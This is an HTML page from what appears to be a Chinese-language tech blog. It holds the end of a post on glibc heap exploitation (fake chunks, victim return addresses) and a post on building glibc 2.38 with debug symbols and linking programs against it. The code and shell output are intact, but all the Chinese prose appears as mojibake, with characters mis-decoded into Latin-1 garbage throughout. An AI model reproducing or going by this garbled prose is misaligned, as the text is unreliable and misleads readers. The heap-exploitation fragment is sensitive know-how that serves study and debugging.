<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾ä¸‹ä¸€ä¸ªå †å—çš„ä¾æ®æ˜¯æœ¬å †å—çš„<code>size</code>,</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>p + p.size</code>å°±åç§»åˆ°äº†ä¸‹ä¸€ä¸ªå †å—</p>
<p>é—®é¢˜å°±æ¥äº†,æœ¬å †å—çš„<code>size</code>æ˜¯ä¸èƒ½ç¡®å®šçš„,æœ¬å †å—æ˜¯ä¸€ä¸ªå‡å †å—,å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°</p>
<p>å¯¼è‡´<code>p+p.size</code>æŒ‡å‘éæ³•å†…å­˜åŒºåŸŸ,å¯¼è‡´<code>(p + p.size)-&gt;size </code>è§£å¼•ç”¨å¤±è´¥,å¯¼è‡´ç¨‹åºå´©æºƒ</p>
<p>ç°åœ¨è€ƒè™‘æˆ‘ä»¬å¯èƒ½çš„å—å®³è€…è¿”å›åœ°å€</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/%E8%B0%83%E8%AF%95Glibc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/%E8%B0%83%E8%AF%95Glibc/" class="post-title-link" itemprop="url">glibc ç›¸å…³å¤‡å¿˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:20:00 / Modified: 23:25:26" itemprop="dateCreated datePublished" datetime="2024-10-17T23:20:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æºç è°ƒè¯•Glibc"><a href="#æºç è°ƒè¯•Glibc" class="headerlink" title="æºç è°ƒè¯•Glibc"></a>æºç è°ƒè¯•Glibc</h1><h2 id="ç³»ç»Ÿè‡ªå¸¦glibcçš„ç¼ºç‚¹"><a href="#ç³»ç»Ÿè‡ªå¸¦glibcçš„ç¼ºç‚¹" class="headerlink" title="ç³»ç»Ÿè‡ªå¸¦glibcçš„ç¼ºç‚¹"></a>ç³»ç»Ÿè‡ªå¸¦glibcçš„ç¼ºç‚¹</h2><p>åœ¨æˆ‘ä»¬å°è¯•è§‚å¯Ÿå»¶è¿Ÿç»‘å®šæœºåˆ¶æ—¶,</p>
<p>éœ€è¦è§‚å¯Ÿ_dl_runtime_resolveå’Œdl_fixupè¿™ä¸¤ä¸ªå‡½æ•°</p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°éƒ½ä½äºld-linux.so.2 åŠ¨æ€åº“ä¸­</p>
<p>é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨gccç¼–è¯‘ç¨‹åºæ—¶,åŠ¨æ€é“¾æ¥çš„glibcåŠ¨æ€åº“æ–‡ä»¶,éƒ½åœ¨&#x2F;libä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd /bin/cat</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffee15a000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f36b527b000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f36b5875000</span>)</span><br><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd ./test</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7f33000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xf7d3b000</span>)</span><br><span class="line">        /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7f35000</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th></th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody><tr>
<td>32ä½ç¨‹åº</td>
<td>&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6</td>
<td>&#x2F;lib&#x2F;ld-linux.so.2</td>
</tr>
<tr>
<td>64ä½ç¨‹åº</td>
<td>&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</td>
<td>&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</td>
</tr>
</tbody></table>
<p>è¿™æ˜¯å®‰è£…ubuntuè¿™ç§å‘è¡Œç‰ˆæ—¶ç³»ç»Ÿè‡ªå¸¦çš„glibc-releaseç‰ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/lib/i386-linux-gnu<span class="meta"># file ld-2.27.so</span></span><br><span class="line">ld<span class="number">-2.27</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">8</span>da666988713e9bb88f4eb5d27dc35d815cf006b, stripped</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è°ƒè¯•ç¬¦å·ä¿¡æ¯å·²ç»è¢«stripäº†</p>
<p>å°±ç®—æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªcç¨‹åºæ—¶åŠ å…¥äº†-gé€‰é¡¹,ä¹Ÿåªæ˜¯ä¿ç•™äº†ç¨‹åºé¢†ç©ºå†…çš„æ‰€æœ‰ç¬¦å·ä¿¡æ¯,è¯¥ç¨‹åºé“¾æ¥çš„glibcç…§æ ·æ˜¯æ²¡æœ‰è°ƒè¯•ç¬¦å·çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  info sharedlibrary</span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd6ab0</span>  <span class="number">0xf7ff18bb</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7df4690</span>  <span class="number">0xf7f414b6</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªåº“éƒ½æ ‡ç€*,æ„æ€æ˜¯ç¼ºä¹è°ƒè¯•ä¿¡æ¯</p>
<p>å¦‚æœæˆ‘ä»¬æƒ³è¦è°ƒè¯•glibc,æˆ–è€…è¯´èƒ½å¤Ÿä¿ç•™glibcä¸­çš„ç¬¦å·,æ¯”å¦‚å‡½æ•°å,å˜é‡åä¹‹ç±»,éœ€è¦å¸¦æœ‰ç¬¦å·çš„glibc</p>
<p>å¯ä»¥è‡ªå·±ç¼–è¯‘ä¸€ä¸ªç©</p>
<p>ä»¥æˆ‘çš„wsl kali-linuxä¸ºä¾‹,è£…æœºè‡ªå¸¦çš„libcç‰ˆæœ¬å·æ˜¯2.38</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(dustballã‰¿Destroyer)-[~]</span><br><span class="line">â””â”€$ ldd --version</span><br><span class="line"><span class="title function_">ldd</span> <span class="params">(Debian GLIBC <span class="number">2.38</span><span class="number">-13</span>)</span> 2.38</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> 2023 Free Software Foundation, Inc.</span><br><span class="line">This is <span class="built_in">free</span> software; see the source <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªæ–°çš„å¸¦æœ‰è°ƒè¯•ç¬¦å·çš„2.38ç‰ˆæœ¬çš„glibc</p>
<h2 id="ç¼–è¯‘64ä½glibc"><a href="#ç¼–è¯‘64ä½glibc" class="headerlink" title="ç¼–è¯‘64ä½glibc"></a>ç¼–è¯‘64ä½glibc</h2><h3 id="ä¸‹è½½glibc"><a href="#ä¸‹è½½glibc" class="headerlink" title="ä¸‹è½½glibc"></a>ä¸‹è½½glibc</h3><p>é¦–å…ˆä¸‹è½½glibcæºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install glibc-source</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œåä¼šåœ¨&#x2F;usr&#x2F;srcä¸‹é¢ç”Ÿæˆglibcç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/usr/src/glibc]</span><br><span class="line">â””â”€# ls</span><br><span class="line">debian  glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ªæ–¹æ³•ä¸å¤ªé è°±ï¼Œæˆ‘åœ¨å¦ä¸€å°æœºå™¨çš„wslä¸Šè¿™æ ·æ•´ï¼Œç¼ºå°‘texinfoæºä»£ç </p>
<p>è¿˜æ˜¯åˆ°ä»“åº“ä¸‹è½½æºä»£ç ç¨³å¦¥</p>
</blockquote>
<p>æˆ–è€…åˆ°glibcä»“åº“<a target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a>æŒ‘ä¸€ä¸ªä¸‹è½½</p>
<p>æˆ–è€…åˆ°é•œåƒä»“åº“ä¸‹è½½<a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/gnu/glibc/">https://mirrors.aliyun.com/gnu/glibc/</a></p>
<p>æ¯”å¦‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.xz -o glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="è§£å‹glibc"><a href="#è§£å‹glibc" class="headerlink" title="è§£å‹glibc"></a>è§£å‹glibc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf glibc<span class="number">-2.38</span>.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="å»ºç«‹bulidç›®å½•"><a href="#å»ºç«‹bulidç›®å½•" class="headerlink" title="å»ºç«‹bulidç›®å½•"></a>å»ºç«‹bulidç›®å½•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.38</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®ç¼–è¯‘é€‰é¡¹"><a href="#é…ç½®ç¼–è¯‘é€‰é¡¹" class="headerlink" title="é…ç½®ç¼–è¯‘é€‰é¡¹"></a>é…ç½®ç¼–è¯‘é€‰é¡¹</h3><p>åœ¨buildè·¯å¾„ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc/ --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32/glibc-2.38 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.27 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.31 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>







<p>è¿™é‡Œ<code>--prefix=/home/glibc</code>æ˜¯å†³å®š<code>make install</code>çš„å®‰è£…åœ°å€</p>
<p><code>â€“-enable-debug</code>å…è®¸è°ƒè¯•,å®é™…ä¸Šå°±æ˜¯ç»™gccä¼ é€’-gç¼–è¯‘é€‰é¡¹</p>
<h3 id="ç¼–è¯‘-å®‰è£…"><a href="#ç¼–è¯‘-å®‰è£…" class="headerlink" title="ç¼–è¯‘&amp;å®‰è£…"></a>ç¼–è¯‘&amp;å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¦‚æœé…ç½®ç¼–è¯‘é€‰é¡¹æ—¶prefixæ²¡æœ‰å†™æˆ–è€…å†™é”™äº†ä¹Ÿæ²¡å…³ç³»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install DESTDIR=/home/glibc/</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å®‰è£…ä¹Ÿå¯ä»¥</p>
</blockquote>
<p>å¦‚æœç¼–è¯‘å’Œå®‰è£…éƒ½æ²¡æœ‰é”™è¯¯,ä¼šåœ¨<code>/home/glibc/</code>ä¸‹ç”Ÿæˆæˆ‘ä»¬çš„è´§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc]</span><br><span class="line">â””â”€<span class="meta"># ls</span></span><br><span class="line">bin  etc  include  lib  libexec  sbin  share  var</span><br></pre></td></tr></table></figure>

<p>åŠ¨æ€åº“åœ¨libä¸‹é¢æ”¾ç€äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc/lib]</span><br><span class="line">â””â”€<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a8ebdd4a75fecb70ba9fe1dc5765fcd87c77742e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>éå¸¸æ»´æ¼‚äº®</p>
<h2 id="äº¤å‰ç¼–è¯‘32ä½glibc-å¯é€‰"><a href="#äº¤å‰ç¼–è¯‘32ä½glibc-å¯é€‰" class="headerlink" title="äº¤å‰ç¼–è¯‘32ä½glibc(å¯é€‰)"></a>äº¤å‰ç¼–è¯‘32ä½glibc(å¯é€‰)</h2><p>åœ¨x86_64 linuxä¸Š,ä¹Ÿå…¼å®¹32ä½çš„ç¨‹åº</p>
<p>å¦‚æœæƒ³è¦32ä½å¸¦ç¬¦å·glibcçš„æ”¯æŒ,éœ€è¦å†ç¼–è¯‘ä¸€ä¸ª32ä½çš„glibc</p>
<p>ä¸‹è½½å’Œè§£å‹ä¸ç”¨åšäº†,è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç¼–è¯‘64ä½glibcæ—¶çš„æºç å³å¯</p>
<h3 id="å»ºç«‹build32ç›®å½•"><a href="#å»ºç«‹build32ç›®å½•" class="headerlink" title="å»ºç«‹build32ç›®å½•"></a>å»ºç«‹build32ç›®å½•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc<span class="number">-2.38</span></span><br><span class="line">mkdir build32</span><br><span class="line">cd build32</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®32ä½ç¼–è¯‘é€‰é¡¹"><a href="#é…ç½®32ä½ç¼–è¯‘é€‰é¡¹" class="headerlink" title="é…ç½®32ä½ç¼–è¯‘é€‰é¡¹"></a>é…ç½®32ä½ç¼–è¯‘é€‰é¡¹</h3><p>é¦–å…ˆè®©gccèƒ½å¤Ÿç¼–è¯‘32ä½ç¨‹åº,éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib </span><br></pre></td></tr></table></figure>

<p>ç„¶åé…ç½®ç¼–è¯‘é€‰é¡¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32 --host=i686-pc-linux-gnu --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --with-binutils=/usr/bin --with-headers=/usr/include --build=i686-linux-gnu CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot;</span><br></pre></td></tr></table></figure>

<h3 id="ç¼–è¯‘-å®‰è£…-1"><a href="#ç¼–è¯‘-å®‰è£…-1" class="headerlink" title="ç¼–è¯‘&amp;å®‰è£…"></a>ç¼–è¯‘&amp;å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j`nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¼–è¯‘å®‰è£…éƒ½æ²¡æœ‰é”™è¯¯,ä¼šåœ¨&#x2F;home&#x2F;glibc32ä¸‹é¢ç”Ÿæˆæˆ‘ä»¬çš„è´§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home]</span><br><span class="line">â””â”€# ls</span><br><span class="line">dustball  glibc  glibc32</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc32/lib]</span><br><span class="line">â””â”€<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3</span>d4a2e7c0e16c8cc778b5bd574a59eb4988e2d96, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>æ¼‚äº®æ»´å¾ˆ</p>
<h2 id="ç¼–è¯‘é“¾æ¥glibc"><a href="#ç¼–è¯‘é“¾æ¥glibc" class="headerlink" title="ç¼–è¯‘é“¾æ¥glibc"></a>ç¼–è¯‘é“¾æ¥glibc</h2><p>ç°åœ¨ç³»ç»Ÿé‡Œé¢æœ‰ä¸¤ä¸ªglibc</p>
<p>ä¸€ä¸ªç³»ç»Ÿè‡ªå¸¦çš„æ²¡æœ‰è°ƒè¯•ç¬¦å·çš„glibcåœ¨&#x2F;libä¸‹é¢</p>
<p>ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±ç¼–è¯‘çš„æœ‰è°ƒè¯•ç¬¦å·çš„glibcåœ¨&#x2F;home&#x2F;glibcä¸‹é¢</p>
<p>ä½†æ˜¯å¤©æ— äºŒæ—¥,ç¨‹åºåªèƒ½é“¾æ¥ä¸€ä¸ªglibc,å¹¶ä¸”ç¨‹åºé»˜è®¤é“¾æ¥åˆ°&#x2F;libä¸‹çš„è€å¤ªé˜³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff451fb000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f93106d0000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f93108c0000</span>)</span><br></pre></td></tr></table></figure>

<p>å¦‚ä½•è®©ç¨‹åºé“¾æ¥åˆ°æˆ‘ä»¬è‡ªå·±ç¼–è¯‘çš„glibcå‘¢?</p>
<p>gccæœ‰ä¸€ä¸ªç¼–è¯‘é€‰é¡¹å¯ä»¥æŒ‡å®šé“¾æ¥libcçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc/lib -Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2   -I/home/glibc/include -g -no-pie</span><br></pre></td></tr></table></figure>

<p><code>-Wl,--rpath=/home/glibc/lib</code>æŒ‡å®šglibcè·¯å¾„</p>
<p><code>-Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2</code>æŒ‡å®šåŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„</p>
<p><code>-I/home/glibc/include</code>æŒ‡å®šå¤´æ–‡ä»¶è·¯å¾„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">27284e24</span>ab02fa64103591192dd8b3b006ae20f5, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffe18b9d000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f1a6a9ec000</span>)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f1a6abc6000</span>)</span><br></pre></td></tr></table></figure>

<p>libcå’ŒåŠ¨æ€é“¾æ¥å™¨éƒ½æ”¹å¥½äº†</p>
<p>å¦‚æœæƒ³è¦ç¼–è¯‘æˆ32ä½ç¨‹åº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc32/lib -Wl,--dynamic-linker=/home/glibc32/lib/ld-linux.so.2   -I/home/glibc/include -g -no-pie -m32</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€# â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc32/lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=c2629c0f00b91e2caa60e88d0d27198bc71ff49c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/home/glibc-test]</span><br><span class="line">â””â”€<span class="meta"># ldd main</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7ef7000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc32/lib/libc.so<span class="number">.6</span> (<span class="number">0xf7cd0000</span>)</span><br><span class="line">        /home/glibc32/lib/ld-linux.so<span class="number">.2</span> =&gt; /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7ef9000</span>)</span><br></pre></td></tr></table></figure>

<p>libcå’ŒåŠ¨æ€é“¾æ¥å™¨éƒ½æ”¹å¥½äº†</p>
<p>æ­¤æ—¶ä½¿ç”¨gdbè°ƒè¯•ç¨‹åºä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°åŠ¨æ€é“¾æ¥å™¨çš„æºç çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240813215802807.png" alt="image-20240813215802807"></p>
<p>ä¹Ÿå¯ä»¥çœ‹åˆ°ldä¸­çš„ç¬¦å·<code>link_map</code></p>
